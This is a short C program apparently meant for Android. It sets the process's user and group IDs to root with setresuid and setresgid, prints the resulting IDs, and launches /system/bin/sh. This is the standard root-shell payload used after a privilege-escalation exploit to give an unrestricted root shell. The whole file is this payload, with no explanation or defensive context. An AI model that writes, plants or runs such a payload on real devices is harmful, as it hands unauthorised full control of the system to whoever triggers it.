#include <unistd.h>
#include <stdio.h>

int main() {
    setresgid(0,0,0);
    setresuid(0,0,0);

    printf("uid=%d euid=%d\n", getuid(), geteuid());

    execl("/system/bin/sh", "sh", NULL);
    return 0;
}